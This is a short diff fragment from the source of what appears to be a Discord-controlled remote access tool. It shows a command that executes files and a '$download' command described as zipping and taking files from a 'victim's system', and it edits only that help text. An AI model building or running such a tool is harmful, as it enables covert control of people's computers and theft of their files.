@@ -428,7 +428,7 @@ async def run(ctx, file_path: str = None):
     except Exception as e:
         await ctx.reply(f"Error: Could not execute the file. {str(e)}")    
 
-@bot.command(help="Zips and downloads a file from victim's system, format $download {file (D:/file.png)}")
+@bot.command(help="Zips and downloads a file from victim's system, format $download {file (D:/file.png)} (attached file is downloaded)")
 async def download(ctx, file_path: str = None):
     if not file_path:
         await ctx.reply("Error: No file path provided. Please specify the file path to download.")
